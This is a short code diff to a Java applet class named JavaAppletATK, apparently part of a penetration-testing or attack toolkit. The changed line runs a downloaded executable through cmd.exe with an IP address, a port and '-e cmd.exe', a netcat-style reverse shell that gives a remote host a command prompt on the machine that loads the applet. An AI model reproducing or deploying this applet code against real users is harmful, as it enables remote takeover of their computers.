@@ -39,7 +39,7 @@ public class JavaAppletATK extends Applet {
 			out.flush();
 			out.close();
 			in.close();
-			f = Runtime.getRuntime().exec("cmd.exe /c " + expath + "<IP_ADDRESS> -e cmd.exe");
+			f = Runtime.getRuntime().exec("cmd.exe /c " + expath + "<IP_ADDRESS> <PORT> -e cmd.exe");
 		}
 	} catch(IOException e) {
 		e.printStackTrace();
